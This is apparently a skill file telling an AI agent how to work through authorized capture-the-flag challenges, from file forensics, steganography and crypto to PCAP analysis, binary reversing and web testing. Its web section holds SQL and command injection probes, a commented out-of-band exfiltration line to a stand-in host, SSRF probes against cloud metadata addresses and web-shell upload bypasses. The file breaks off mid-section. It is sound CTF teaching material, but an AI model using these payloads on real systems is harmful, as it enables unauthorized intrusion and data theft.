---
name: ctf_recon_and_solve
description: "Use for CTF: recon files, pick tools, verify flags."
version: 2.0.0
author: Hermes Agent
license: MIT
platforms: [linux, windows]
metadata:
  hermes:
    tags: [ctf, security, recon, forensics, stego, crypto, reversing, pwn, web, osint]
    related_skills: [systematic-debugging, github-issues]
---

# Advanced CTF Reconnaissance and Solve

## Overview

Structured, progressive methodology for authorized Capture The Flag challenges. Each phase builds on the previous one. **Never jump phases without cause.**

**Core principle:** Understand the data before solving. Guessing flags wastes time.
**Working environment:** All CTF file analysis and commands run on the Kali SSH terminal. Python scripts use `~/ctf-env313` when needed.

### Decision Flow

```
Initial Assessment (Phase 0)
       ↓
Static Recon (Phase 1) — always run, low cost
       ↓
  ┌────┴──────────────┬──────────────┬──────────────┬───────────┐
  ↓                   ↓              ↓              ↓           ↓
Stego 2   Crypto 3   Network 4    Binary/RE 5    Web 6       OSINT 7
  ↓                   ↓              ↓              ↓           ↓
  └───────────────────┴──────────────┴──────────────┴───────────┘
                              ↓
        Investigation Record (Phase 8) — continuous
                              ↓
                     Flag Verification (Phase 9)
                              ↓
               Cross-category pivot if block (Phase 10)
```

**After any phase produces no result, pivot to another category via Phase 10 before repeating the same approach with different tools.**

---

## Phase 0: Initial Assessment

**Always start here. Never touch files or targets without this step.**

### 0A — Challenge Classification

1. **Category** (forensics / steganography / crypto / reversing / pwn / web / osint / misc)
2. **Provided assets** — list every file target
3. **Flag format** — `flag{...}`, `CTF{...}`, `KLD-...`, custom regex
4. **Cross-category seed** — even if the category says "forensics", the flag may be encoded, stego-hidden, or require web interaction. Note this as a hypothesis at the start.

### 0B — Initial Recon (Kali SSH)

```bash
# Working directory and assets
pwd && ls -la

# Identify every file type (actual type vs extension)
file *

# Tree view for directory-based challenges
tree -a 2>/dev/null || find . -type f | head -100
```

**Why:** Polyglot files (e.g. a PNG that's also a ZIP) are a common CTF trick.

### 0C — Quick Sensitivity Check

```bash
# Large files may contain appended data
ls -lhS

# Suspiciously empty or tiny files
find . -size -100c -type f 2>/dev/null

# Check permissions/special attributes
lsattr * 2>/dev/null; getfattr -d * 2>/dev/null
```

**Why:** Hidden data sometimes lives in extended attributes or oddly-sized files.

---

## Phase 1: Static Reconnaissance & Advanced Forensics

**Always run. Read-only. Do NOT modify originals — copy before any extraction.**

### 1A — Metadata Extraction (all files)

```bash
# EXIF on images
exiftool *.png *.jpg *.jpeg *.gif *.bmp *.tiff 2>/dev/null

# PDF metadata
pdfinfo *.pdf 2>/dev/null

# Generic strings — every file type
strings -n 6 * | head -1000

# Targeted flag-pattern grep
strings * | grep -iE '(flag|ctf|key|secret|password|base64|hex|[{]|})'

# Extended attributes
for f in *; do echo "=== $f ==="; xattr -l "$f" 2>/dev/null; done
```

**Why:** Coordinates, comments, software artifacts, base64 fragments are frequently in metadata.

### 1B — Embedded File Detection

```bash
# Check for appended archives/data
binwalk *.png *.jpg *.pdf *.zip *.gif 2>/dev/null

# JPEG: data after EOI marker
python3 -c "
import glob, os
for path in glob.glob('*.jpg') + glob.glob('*.jpeg'):
    with open(path, 'rb') as f:
        d = f.read()
    eoi = d.rfind(b'\xff\xd9')
    tail_len = len(d) - eoi - 2
    if tail_len > 0:
        print(f'{path}: {tail_len} bytes after EOI')
        print(f'Tail preview: {d[eoi+2:eoi+2+80]}')
"

# PNG: data after IEND chunk
python3 -c "
import glob
for path in glob.glob('*.png'):
    with open(path, 'rb') as f:
        d = f.read()
    iend = d.find(b'IEND')
    if iend >= 0:
        tail = d[iend+12:]
        if tail:
            print(f'{path}: {len(tail)} bytes after IEND')
            print(f'Tail preview: {tail[:80]}')
"

# File carving (blind extraction from any file)
foremost -i file -o /tmp/carved 2>/dev/null
```

**Why:** CTFs commonly append ZIP, text, or second images after end markers.

### 1C — PDF / Document Deep Analysis

```bash
# Extract all text
pdftotext file.pdf - | head -200

# List embedded files (attachments)
pdfdetach -list file.pdf 2>/dev/null

# Extract all attachments
pdfdetach -saveall file.pdf 2>/dev/null

# Check for JavaScript / actions
python3 -c "
with open('file.pdf', 'rb') as f:
    d = f.read()
    js_indicators = [b'/JavaScript', b'/JS', b'/Action', b'/OpenAction', b'/AA']
    for ind in js_indicators:
        pos = d.find(ind)
        if pos >= 0:
            ctx = d[max(0,pos-20):pos+60]
            print(f'{ind.decode()} at {pos}: {ctx}')
"

# PDF structure (streams, objects)
python3 -c "
with open('file.pdf', 'rb') as f:
    d = f.read()
    obj_count = d.count(b'obj')
    stream_count = d.count(b'stream')
    print(f'Objects: {obj_count}, Streams: {stream_count}')
    # Check for hidden text between objects
    import re
    texts = re.findall(rb'\((.*?)\)', d)
    for t in texts[:20]:
        decoded = t.decode('latin-1', errors='replace')
        if len(decoded) > 4 and not all(c in ' \n\r\t' for c in decoded):
            print(f'Text: {decoded[:100]}')
"
```

**Why:** PDFs can embed files, JS triggers, or hide text in invisible layers/white-on-white.

### 1D — Deleted File Recovery

```bash
# Extract all strings from raw device image
strings -n 8 disk_image.dd | grep -iE '(flag|ctf|jpg|png|zip|pdf)' | head -100

# Carve deleted files
foremost -i disk_image.dd -o /tmp/foremost_out 2>/dev/null

# Scalpel for deeper carving (if foremost insufficient)
# scalpel -c /etc/scalpel/scalpel.conf disk_image.dd -o /tmp/scalpel_out 2>/dev/null

# Recover deleted partitions/volumes
# testdisk /dev/loop0 2>/dev/null (ask user first — interactive)
```

**Why:** Deleted files often contain the original flag or the tool used to hide it.

### 1E — Filesystem & Volume Analysis

```bash
# Mount disk image read-only
# sudo mkdir -p /mnt/ctf && sudo mount -o ro,loop disk_image.dd /mnt/ctf

# List all files with timestamps
# find /mnt/ctf -type f -ls

# Check unallocated space / file slack
# sudo icat disk_image.dd <inode> 2>/dev/null
```

### 1F — Timeline Analysis

```bash
# Create body file from disk image
# fls -r -m / disk_image.dd > /tmp/body.txt 2>/dev/null
# mactime -b /tmp/body.txt -d > /tmp/timeline.csv 2>/dev/null

# Quick timeline from directory (no disk image)
ls -laR --full-time . 2>/dev/null | grep -v '^total'

# Find files modified after a known event
find . -newer reference_file -type f 2>/dev/null
```

**Why:** Timeline analysis reveals which files were created/modified during the challenge, narrowing targets.

### 1G — Memory Forensics (Volatility)

```bash
# Only if a RAM dump (.mem, .raw, .vmem, .dump) is provided
# volatility2 -f memory.dump imageinfo 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 pslist 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 cmdline 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 consoles 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 notepad 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 clipboard 2>/dev/null
# volatility2 -f memory.dump --profile=Win7SP1x64 filescan 2>/dev/null | grep -iE '(flag|txt|png|jpg)'
```

**Why:** Memory images capture running processes, clipboard contents, command history — often containing flags in plaintext.

---

## Phase 2: Advanced Steganography

**Only dive deep if Phase 1 found encoded/suspicious data, or the challenge explicitly requires stego.**

### 2A — LSB & Channel Analysis (PNG/BMP)

```bash
# Quick zsteg sweep (auto-detects LSB, MSB, palette)
zsteg -a file.png 2>/dev/null

# Zsteg on specific channels
zsteg -a file.png 2>/dev/null | grep -v '^==='

# Manual RGB channel extraction
python3 -c "
from PIL import Image
import numpy as np
img = Image.open('file.png')
arr = np.array(img)
print(f'Shape: {arr.shape}, dtype: {arr.dtype}')
# Check if single-channel variation hints at hidden data
for c in range(arr.shape[2] if len(arr.shape) > 2 else 1):
    channel = arr[:,:,c] if len(arr.shape) > 2 else arr
    lsb = channel & 1
    print(f'Channel {c}: LSB ones ratio = {lsb.sum() / lsb.size:.3f}')
    # Try to reconstruct LSB as image
    (lsb * 255).astype(np.uint8).tofile(f'/tmp/lsb_ch{c}.bin')
"

# Extract all LSBs as binary
python3 -c "
from PIL import Image
import numpy as np
img = Image.open('file.png').convert('RGB')
arr = np.array(img)
bits = (arr.ravel() & 1).astype(str).tolist()
bits_str = ''.join(bits)
# Every 8 bits -> 1 byte
chars = []
for i in range(0, len(bits_str)//8 * 8, 8):
    byte_val = int(bits_str[i:i+8], 2)
    chars.append(chr(byte_val) if 32 <= byte_val < 127 else '.')
print(''.join(chars))
"

# Check alpha channel for hidden data
python3 -c "
from PIL import Image
import numpy as np
img = Image.open('file.png')
if img.mode == 'RGBA':
    r,g,b,a = img.split()
    print(f'Alpha unique values: {len(set(a.getdata()))}')
    if len(set(a.getdata())) > 1:
        a.save('/tmp/alpha_channel.png')
        print('Alpha channel saved for inspection')
"
```

### 2B — PNG Chunk Analysis

```bash
# List every PNG chunk
python3 -c "
import struct, glob
for path in glob.glob('*.png'):
    with open(path, 'rb') as f:
        d = f.read()
    print(f'--- {path} ({len(d)} bytes) ---')
    pos = 8  # Skip signature
    while pos < len(d) - 4:
        length = struct.unpack('>I', d[pos:pos+4])[0]
        chunk_type = d[pos+4:pos+8].decode('ascii', errors='replace')
        print(f'  [{chunk_type}] len={length} at offset {pos}')
        pos += 12 + length
        if chunk_type == 'IEND':
            break

# Check for uncommon/private chunks ('tEXt', 'zTXt', 'iTXt', 'gIFg', 'gIFx', custom)
# Hidden text is often in tEXt/zTXt chunks
python3 -c "
from PIL import Image
img = Image.open('file.png')
for k, v in img.info.items():
    if isinstance(v, bytes):
        print(f'{k}: {v[:200]}')
    else:
        print(f'{k}: {str(v)[:200]}')
"
```

### 2C — JPEG Structure Analysis

```bash
# List JPEG markers
python3 -c "
with open('file.jpg', 'rb') as f:
    d = f.read()
markers = {
    0xd8: 'SOI', 0xe0: 'APP0/JFIF', 0xe1: 'APP1/EXIF', 0xe2: 'APP2',
    0xed: 'APP13/Photoshop', 0xee: 'APP14/Adobe', 0xdb: 'DQT',
    0xc0: 'SOF0', 0xc4: 'DHT', 0xda: 'SOS', 0xd9: 'EOI',
    0xfe: 'COM/comment', 0xdd: 'DRI'
}
pos = 0
while pos < len(d) - 1:
    if d[pos] == 0xff:
        marker = d[pos+1]
        if marker == 0xd9:  # EOI
            print(f'EOI at {pos}')
            if pos + 2 < len(d):
                print(f'DATA AFTER EOI: {len(d) - pos - 2} bytes')
            break
        name = markers.get(marker, f'0x{marker:02x}')
        if marker in (0xd8, 0xd9):
            print(f'{name} at {pos}')
            pos += 2
            continue
        length = int.from_bytes(d[pos+2:pos+4], 'big')
        payload = d[pos+4:pos+2+length]
        print(f'{name} at {pos} len={length}')
        if marker == 0xfe:  # Comment
            print(f'  Comment: {payload[:200]}')
        pos += 2 + length
    else:
        pos += 1
"
```

### 2D — Spectrogram Analysis (Audio)

```bash
# Generate spectrogram image from WAV/MP3/FLAC
# sox audio.wav -n spectrogram -o /tmp/spectrogram.png 2>/dev/null
# For mp3/flac: sox audio.mp3 -n spectrogram -o /tmp/spectrogram.png 2>/dev/null

# Alternative with ffmpeg
# ffmpeg -i audio.wav -lavfi showspectrumpic=s=800x400 /tmp/spectrogram.png 2>/dev/null

# Audacity spectrogram via Python (if pysox available)
python3 -c "
import subprocess, glob
for f in glob.glob('*.wav') + glob.glob('*.mp3') + glob.glob('*.flac'):
    out = f'/tmp/{f}.spectrogram.png'
    try:
        subprocess.run(['sox', f, '-n', 'spectrogram', '-o', out],
                      capture_output=True, timeout=30)
        print(f'Spectrogram: {out}')
    except: pass
"
```

**Why:** CTF audio challenges often encode flags as visual text in spectrograms.

### 2E — QR / Barcode Extraction

```bash
# Install: pip install pyzbar (or zbarlight)
python3 -c "
from PIL import Image
try:
    from pyzbar.pyzbar import decode
    for path in ['file.png', 'file.jpg']:
        try:
            results = decode(Image.open(path))
            for r in results:
                print(f'{path}: {r.data.decode()}')
        except: pass
except ImportError:
    # Fallback to zbar CLI
    import subprocess
    subprocess.run(['zbarimg', 'file.png'], capture_output=False)
"
```

### 2F — Image Transformations

```bash
# Check if flag is revealed by flipping/rotating
python3 -c "
from PIL import Image
img = Image.open('file.png')
# Rotate and flip in all directions
for op_name, op in [('flip_lr', Image.FLIP_LEFT_RIGHT),
                     ('flip_tb', Image.FLIP_TOP_BOTTOM),
                     ('rot_90', Image.ROTATE_90),
                     ('rot_180', Image.ROTATE_180),
                     ('rot_270', Image.ROTATE_270)]:
    transformed = img.transpose(op)
    transformed.save(f'/tmp/{op_name}.png')
print('Transformed images saved to /tmp/')
"

# Check for color-channel separations
python3 -c "
from PIL import Image
import numpy as np
img = Image.open('file.png').convert('RGB')
r,g,b = img.split()
r.save('/tmp/red_channel.png')
g.save('/tmp/green_channel.png')
b.save('/tmp/blue_channel.png')
# Grayscale
img.convert('L').save('/tmp/gray.png')
# Inverted
Image.fromarray(255 - np.array(img.convert('L'))).save('/tmp/inverted.png')
print('Channel-separated images saved to /tmp/')
"
```

### 2G — Steghide (JPG/WAV)

```bash
# Try empty passphrase first
steghide extract -sf file.jpg -p "" -f 2>&1

# Try common passphrases when empty fails: password, secret, flag, ctf, key
for pw in "" "password" "secret" "flag" "ctf" "key" "hidden" "steghide" "passw0rd"; do
  result=$(steghide extract -sf file.jpg -p "$pw" -f 2>&1)
  if echo "$result" | grep -qi 'wrote'; then
    echo "SUCCESS with passphrase='$pw': $result"
    break
  fi
done
```

**Why:** Steghide with empty or weak passphrases is a common CTF pattern.

---

## Phase 3: Advanced Cryptography

**Approach systematically — identify the encoding/cipher before breaking it.**

### 3A — Encoding Identification & Decoding

| Pattern | Likely Encoding |
|---------|-----------------|
| `A-Za-z0-9+/=` | Base64 |
| `0-9a-f` (even length) | Hex |
| `0-3` only | Base4/Quaternary |
| `0-7` sequences | Octal |
| Dots and dashes | Morse code |
| `A-Z` only (no lowercase) | Base32 |
| `0-9` only | Decimal / ASCII codes |
| `0-1` sequences (length % 8 == 0) | Binary → ASCII |
| `=\\` or unusual chars | Brainfuck / esolang |
| UUencoded / quoted-printable | UUencode / QP |

```bash
# Automated try-all decoders
python3 -c "
import base64, binascii, re

data = 'ciphertext_string'

# Try base64
try:
    decoded = base64.b64decode(data)
    if all(32 <= b < 127 for b in decoded):
        print(f'Base64: {decoded.decode()}')
except: pass

# Try hex
try:
    decoded = bytes.fromhex(data)
    if all(32 <= b < 127 for b in decoded):
        print(f'Hex: {decoded.decode()}')
except: pass

# Try base32
try:
    decoded = base64.b32decode(data.upper())
    if all(32 <= b < 127 for b in decoded):
        print(f'Base32: {decoded.decode()}')
except: pass

# Try binary
if all(c in '01 ' for c in data):
    binary_str = data.replace(' ', '')
    chars = []
    for i in range(0, len(binary_str)//8 * 8, 8):
        chars.append(chr(int(binary_str[i:i+8], 2)))
    print(f'Binary: {\"\".join(chars)}')
"
```

### 3B — Classical Cipher Solvers

```bash
# Caesar/ROT brute force
python3 -c "
s = 'ciphertext'
for shift in range(26):
    result = ''.join(chr((ord(c) - 97 + shift) % 26 + 97) if c.isalpha() else c for c in s)
    print(f'ROT{shift:2d}: {result}')
" | head -26

# Atbash (reverse alphabet)
python3 -c "
import string
s = 'ciphertext'
result = ''.join(chr(219 - ord(c)) if c.isalpha() and c.islower() else
                 chr(155 - ord(c)) if c.isalpha() and c.isupper() else c for c in s)
print(f'Atbash: {result}')
"

# XOR single-byte brute force
python3 -c "
data = bytes.fromhex('hexstring')  # or data = b'ciphertext'
for key in range(256):
    decoded = bytes(b ^ key for b in data)
    if any(32 <= b < 127 for b in decoded):
        printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in decoded)
        print(f'XOR key 0x{key:02x}: {printable[:100]}')
    # Also check for flag prefix
    if key > 0:
        decoded = bytes(b ^ key for b in data)
        if b'flag' in decoded.lower() or b'ctf' in decoded.lower():
            print(f'*** FLAG CANDIDATE XOR key 0x{key:02x}: {decoded}')
"

# Multi-byte XOR (Vigenère-like with key length detection)
python3 -c "
data = bytes.fromhex('hexstring')
# Try common key lengths 1-16
for keylen in range(1, 17):
    for guess_key in [b'key', b'secret', b'flag', b'xor', b'ctf', b'password']:
        if len(guess_key) == keylen:
            decoded = bytes(data[i] ^ guess_key[i % keylen] for i in range(len(data)))
            if b'flag' in decoded.lower() or b'ctf' in decoded.lower():
                print(f'Vigenère/XOR key {guess_key}: {decoded[:100]}')
"
```

### 3C — Hash Identification

```bash
hashid <hash_string> 2>/dev/null
# OR
python3 -c "
hash_string = 'hash_value'
hash_len = len(hash_string)
patterns = {
    32: 'MD4/MD5/NT/NTLM',
    40: 'SHA1/RIPEMD160',
    56: 'SHA224/SHA3-224',
    64: 'SHA256/SHA3-256',
    96: 'SHA384/SHA3-384',
    128: 'SHA512/SHA3-512'
}
print(f'Length: {hash_len} chars')
print(f'Possible types: {patterns.get(hash_len, \"Unknown/uncommon length\")}')
# Check if hex
import re
if re.match(r'^[0-9a-f]+$', hash_string):
    bits = hash_len * 4
    print(f'Hex hash — possibly {bits} bits')
"
```

### 3D — RSA Weakness Detection

```bash
# Check for common RSA vulnerabilities
python3 -c "
# Provided values: n, e, c (and optionally p, q, d)
n = 0x...  # modulus
e = 65537  # or 3, 5, 17
c = 0x...  # ciphertext

# Weakness 1: Small e (e=3) — cube root attack
if e == 3:
    import gmpy2
    m, exact = gmpy2.iroot(c, 3)
    if exact:
        print(f'SMALL E ATTACK: m = {bytes.fromhex(hex(int(m))[2:])}')

# Weakness 2: Fermat factoring (p and q close together)
import gmpy2
def fermat_factor(n):
    a = gmpy2.isqrt(n)
    if a * a < n:
        a += 1
    b2 = a * a - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = a * a - n
    b = gmpy2.isqrt(b2)
    return int(a - b), int(a + b)

# Weakness 3: Wiener attack (small d) — use owiener
# from owieners import attack
# d = attack(n, e)
# if d: print(f'Wiener attack: d={d}')
"
```

### 3E — Frequency Analysis

```bash
python3 -c "
from collections import Counter
text = 'ciphertext_string'
text_lower = ''.join(c for c in text.lower() if c.isalpha())
freq = Counter(text_lower)
total = len(text_lower)
print('Frequency:')
for char, count in freq.most_common(26):
    print(f'  {char}: {count/total*100:.1f}%')
print(f'\\nEnglish: ETAOINSHRDLU')
print(f'Got:      {\"\".join(c for c,_ in freq.most_common(10))}')
# If partial match: likely substitution cipher
"
```

### 3F — Automated Candidate Testing

```bash
# Python script: feed all decoders at once, flag-filters output
python3 -c "
import base64, binascii, re

def try_decoders(raw):
    results = []
    s = raw.strip()
    # Base64
    try:
        d = base64.b64decode(s)
        results.append(('base64', d))
    except: pass
    # Base32
    try:
        d = base64.b32decode(s.upper())
        results.append(('base32', d))
    except: pass
    # Hex
    try:
        d = bytes.fromhex(s)
        results.append(('hex', d))
    except: pass
    # Reverse
    results.append(('reverse', s[::-1].encode()))
    # Every ROT
    for shift in range(26):
        r = ''.join(chr((ord(c)-97+shift)%26+97) if c.isalpha() and c.islower() else
                     chr((ord(c)-65+shift)%26+65) if c.isalpha() and c.isupper() else c for c in s)
        if any(w in r.lower() for w in ['flag', 'ctf']):
            results.append((f'rot{shift}', r.encode()))
    return results

with open('candidate.txt') as f:
    data = f.read()
for name, result in try_decoders(data):
    try:
        text = result.decode('utf-8', errors='replace')
        if 'flag' in text.lower() or 'ctf' in text.lower():
            print(f'*** {name.upper()}: {text}')
        else:
            print(f'{name.upper()}: {text[:80]}')
    except:
        print(f'{name.upper()}: (binary) {result[:40].hex()}')
"
```

---

## Phase 4: Network / Traffic Analysis

**Use for PCAP/pcapng files, or when a remote service is provided.**

### 4A — PCAP Quick Stats

```bash
# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs 2>/dev/null

# Endpoints
tshark -r capture.pcap -q -z endpoints,ip 2>/dev/null

# Conversations
tshark -r capture.pcap -q -z conv,tcp 2>/dev/null

# Expert info (malformed, warnings, notes)
tshark -r capture.pcap -q -z expert 2>/dev/null
```

**Why:** Quick stats reveal the protocol mix — flags are often in HTTP, DNS, FTP, or custom TCP streams.

### 4B — HTTP Analysis

```bash
# Export all HTTP objects
tshark -r capture.pcap --export-objects http,/tmp/http_extract 2>/dev/null

# List all HTTP requests
tshark -r capture.pcap -Y http.request -T fields \
  -e http.request.method -e http.request.uri -e http.host \
  -e frame.time_relative 2>/dev/null | head -60

# List all HTTP responses with status
tshark -r capture.pcap -Y http.response -T fields \
  -e http.response.code -e http.content_type \
  -e http.content_length 2>/dev/null | head -40

# Search for flag in HTTP bodies
tshark -r capture.pcap -Y "http contains flag" -T fields -e http.file_data 2>/dev/null

# Follow HTTP streams
for i in $(seq 0 $(tshark -r capture.pcap -T fields -e tcp.stream 2>/dev/null | sort -u | tail -1)); do
  tshark -r capture.pcap -q -z follow,http,ascii,$i 2>/dev/null | head -30
done
```

### 4C — DNS Analysis

```bash
# All DNS queries
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name 2>/dev/null | sort -u

# DNS queries containing suspicious subdomains (potential data exfil)
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name 2>/dev/null | \
  grep -vE '(google|cloudflare|windows|akamai)' | head -40

# DNS TXT records (often contain encoded data)
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt 2>/dev/null

# DNS query lengths (potential exfil by length)
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name -e frame.len 2>/dev/null
```

### 4D — Suspicious Patterns

```bash
# Large data transfers on unusual ports
tshark -r capture.pcap -Y "data.len > 1000 and not tcp.port==80 and not tcp.port==443" 2>/dev/null | head -20

# ICMP with data (ping tunnelling)
tshark -r capture.pcap -Y icmp -T fields -e data.data 2>/dev/null | head -20

# FTP traffic
tshark -r capture.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null

# SMB file transfers
tshark -r capture.pcap -Y smb -T fields -e smb.filename 2>/dev/null

# TLS certificates (can reveal hidden domains)
tshark -r capture.pcap -Y tls.handshake.certificate -T fields \
  -e x509sat.uTF8String -e x509sat.printableString 2>/dev/null
```

### 4E — TCP Stream Follow & Object Extraction

```bash
# Follow TCP stream 0 (ASCII)
tshark -r capture.pcap -q -z follow,tcp,ascii,0 2>/dev/null

# Follow TCP stream as raw (binary data extraction)
tshark -r capture.pcap -q -z follow,tcp,raw,0 2>/dev/null | \
  tail -n +6 | xxd -r -p > /tmp/stream0.bin 2>/dev/null

# Iterate all TCP streams
# for i in $(tshark -r capture.pcap -T fields -e tcp.stream 2>/dev/null | sort -nu); do
#   echo "=== Stream $i ==="
#   tshark -r capture.pcap -q -z follow,tcp,ascii,$i 2>/dev/null | tail -n +6 | head -40
# done
```

---

## Phase 5: Advanced Reverse Engineering

**Only when provided with ELF/PE/Mach-O or other binary files.**

### 5A — Initial Binary Assessment

```bash
# File type & architecture
file binary

# ELF header info
readelf -h binary 2>/dev/null

# Section headers
readelf -S binary 2>/dev/null

# Check security protections
checksec --file=binary 2>/dev/null || python3 -c "from pwn import ELF; e = ELF('./binary'); print(e.checksec())"

# Look for stripped vs not-stripped symbols
file binary | grep -i 'not stripped' >/dev/null && nm binary 2>/dev/null | head -40
```

**Why:** Protections (NX, PIE, RELRO, stack canary) determine exploit difficulty.

### 5B — Static Analysis

```bash
# All readable strings
strings -n 5 binary | head -300

# Strings with flag/crypto patterns
strings -n 5 binary | grep -iE '(flag|key|secret|password|http|base64|xor|encrypt)'

# Symbol table (if not stripped)
nm -C binary 2>/dev/null

# Disassemble main
objdump -d binary -M intel | grep -A 100 '<main>:' | head -120

# Disassemble specific interesting functions
for func in check_flag validate win lose; do
  objdump -d binary -M intel | grep -A 50 "<$func>:" | head -60
done

# PLT/GOT — external function calls
objdump -d binary -M intel | grep '@plt>' | head -30

# ROPgadget search
# ROPgadget --binary binary 2>/dev/null | head -30
```

### 5C — Hardcoded Data Search

```bash
python3 -c "
with open('binary', 'rb') as f:
    d = f.read()
    # Search for flag-like patterns
    import re
    for match in re.finditer(rb'[a-zA-Z0-9_!@#$%^&*(){}]{10,}', d):
        text = match.group().decode('latin-1')
        print(f'0x{match.start():08x}: {text[:80]}')
    
    # XOR brute-force over specific offset ranges
    offsets = [m.start() for m in re.finditer(b'flag|key|secret|xor|encrypt', d.lower())]
    for offset in offsets:
        print(f'Found hint at offset 0x{offset:x}')
"
```

### 5D — Python Automation & Emulation

```bash
# pwntools — explore binary structure
python3 -c "
from pwn import *
e = ELF('./binary')
print(f'Entry: {hex(e.entry)}')
print(f'PIE: {e.pie}')
print(f'Symbols: {list(e.symbols.keys())[:30]}')
print(f'GOT: {list(e.got.keys())[:20]}')
print(f'PLT: {list(e.plt.keys())[:20]}')
"

# pwntools — extract bytes from a function
python3 -c "
from pwn import *
e = ELF('./binary')
if 'main' in e.symbols:
    addr = e.symbols['main']
    size = 64
    data = e.read(addr, size)
    print(f'main bytes at {hex(addr)}: {data.hex()}')
"

# Unicorn emulation for simple XOR loops
# python3 -c "
# from unicorn import *
# from unicorn.x86_const import *
# mu = Uc(UC_ARCH_X86, UC_MODE_64)
# mu.mem_map(0x400000, 0x1000)
# # ... load code, set up, emulate
# "
```

### 5E — Ghidra / radare2 (when static analysis insufficient)

```bash
# radare2 — quick analysis (non-interactive)
# r2 -q -c 'aaa; afl~flag; afl~win; afl~check; afl~validate; s main; pdf; q' binary 2>/dev/null

# radare2 — search for strings with xrefs
# r2 -q -c 'aaa; izz~flag; izz~key; axt sym.main | head -20; q' binary 2>/dev/null

# Ghidra headless — only if radare2 insufficient (heavy)
# $GHIDRA_HOME/support/analyzeHeadless /tmp/ghidra_proj -import binary \
#   -postScript AnalyzeFunctionSizes.java -scriptPath /tmp 2>/dev/null
```

### 5F — GDB / pwndbg Dynamic Analysis

```bash
# Run and auto-catch crash (buffer overflow detection)
# gdb -batch -ex "run" -ex "bt" -ex "info registers" --args ./binary < input 2>/dev/null

# pwndbg checksec
# gdb -batch -ex "checksec" ./binary 2>/dev/null

# Disassemble and step through main
# gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" ./binary 2>/dev/null
```

---

## Phase 6: Advanced Web CTF

**For challenges involving HTTP endpoints or web applications.**

### 6A — HTTP Recon & Fingerprinting

```bash
# Basic connectivity + headers
curl -v http://target:port/ 2>&1 | head -60

# Response headers only (server, framework, cookies)
curl -sI http://target:port/

# Methods discovery
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" http://target:port/)
  echo "$method -> $code"
done

# Check common info files
for path in robots.txt sitemap.xml .git/HEAD .env .htaccess admin/ login/ api/ swagger.json openapi.json .well-known/security.txt; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:port/$path")
  [[ "$code" != "404" ]] && echo "$code $path"
done
```

### 6B — Directory & Parameter Discovery

```bash
# Directory brute force
gobuster dir -u http://target:port/ -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>/dev/null

# Parameter fuzzing (GET)
for param in id file page debug cmd exec action view read download; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:port/?$param=test")
  echo "$param -> $code"
done

# Parameter fuzzing (POST — change Content-Type as needed)
curl -s "http://target:port/" -d "id=1" -w "  HTTP %{http_code}" -o /dev/null

# API enumeration
for path in api v1 v2 api/v1 rest graphql query; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:port/$path")
  [[ "$code" != "404" ]] && echo "$code /$path"
done
```

### 6C — Cookie & Session Analysis

```bash
# Capture cookies
curl -sI http://target:port/ 2>&1 | grep -i 'set-cookie'

# Decode JWT (if found)
# JWT format: header.payload.signature
# python3 -c "
# import base64
# jwt = 'eyJ...token...'
# parts = jwt.split('.')
# for i, part in enumerate(['Header','Payload','Signature'][:len(parts)]):
#     try:
#         decoded = base64.urlsafe_b64decode(part + '==')
#         print(f'{part}: {decoded}')
#     except: pass
# "

# JWT weak secret cracking (if algorithm is HS256)
# python3 -c "
# import jwt
# for secret in ['secret', 'password', 'key', 'flag', 'ctf', 'admin', '12345', 'changeme']:
#     try:
#         decoded = jwt.decode('token', secret, algorithms=['HS256'])
#         print(f'CRACKED with secret={secret}: {decoded}')
#         break
#     except: pass
# "
```

### 6D — SQL Injection

```bash
# Time-based probe
curl -s "http://target:port/?id=1' AND SLEEP(3)-- -" -w "  Time: %{time_total}\n" -o /dev/null

# Error-based probe
curl -s "http://target:port/?id=1'" -w "  HTTP %{http_code}" | head -30

# Union-based
curl -s "http://target:port/?id=1 UNION SELECT 1,2,3-- -"

# SQLmap (expensive — only when SQLi confirmed)
# sqlmap -u "http://target:port/?id=1" --batch --level=3 --risk=2 2>/dev/null
```

### 6E — Command Injection

```bash
# Basic probes
for payload in ';id' '|id' '`id`' '$(id)' '& id'; do
  echo "Payload: $payload"
  curl -s -G "http://target:port/" --data-urlencode "cmd=$payload" | head -10
  echo "---"
done

# Out-of-band exfil test (if blind)
# curl -s "http://target:port/?host=127.0.0.1;curl http://collaborator-test.com/\$(whoami)"
```

### 6F — SSRF

```bash
# Internal network probes
for ip in '127.0.0.1' '0.0.0.0' 'localhost' '169.254.169.254' '[::1]' '10.0.0.1' '172.16.0.1'; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:port/?url=http://$ip/")
  [[ "$code" != "4"* && "$code" != "000" ]] && echo "SSRF candidate: http://$ip -> $code"
done
```

### 6G — IDOR (Insecure Direct Object Reference)

```bash
# Sequential ID enumeration
for id in 1 2 3 4 5 10 100 1000 9999; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:port/user/$id")
  [[ "$code" != "404" ]] && echo "User $id -> $code"
done
```

### 6H — File Upload Exploitation

```bash
# Test file upload endpoint (if found)
# curl -s -F "file=@shell.php" -F "filename=shell.php" http://target:port/upload

# Try extension bypass:
# shell.php5, shell.phtml, shell.php7, shell.php.jpg, shell.php%00.jpg
# shell.php;.jpg, shell.php..jpg, shell.jpg.php, shell.php.

# Check for path traversal in upload
# curl -s -F "file=@exploit.php" 'http://target:port/upload?path=../../../var/www/html/'
```

### 6I — SSTI (Server-Side Template Injection)

```bash
# Probe template engines
